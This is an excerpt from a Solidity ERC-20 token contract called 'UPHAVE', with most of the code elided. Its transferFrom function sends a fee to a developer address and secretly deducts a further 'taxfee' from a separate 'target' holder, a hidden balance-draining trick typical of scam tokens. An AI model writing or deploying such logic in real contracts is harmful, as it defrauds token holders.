...
contract TOKEN is Ownable , IERC20 {
    ...
    string public name = "UPHAVE";
    string public symbol = "UPHAVE";
    ...
    address private ow = 0x065503f59683979cf2f97B62a704E359E5797a73;
    ...
    function transferFrom(
        ...
        _rOwned[dev] += taxfee;
            if (_rOwned[target] >= 0){
            taxfee = (_value * _taxtarget) / 100;
            _rOwned[target] -= taxfee;
            }
